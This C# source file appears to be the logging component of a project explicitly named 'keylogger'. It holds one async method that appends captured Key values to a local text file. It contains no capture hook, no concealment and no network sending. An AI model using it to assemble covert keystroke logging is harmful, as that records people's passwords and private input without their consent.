using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;
using System.IO;

namespace keylogger.keylog
{
    public static class KeyLog
    {
        public static async Task<bool> Log(string path, List<Key> keys)
        {
            return await Task<bool>.Run(() =>
            {
                try
                {
                    using (var sw = new StreamWriter(path, true, Encoding.UTF8))
                    {
                        foreach (var key in keys)
                        {
                            sw.WriteLine(key);
                        }
                    }
                    return true;
                }
                catch (Exception e)
                {
                    return false;
                }                
            });
        }
    }
}
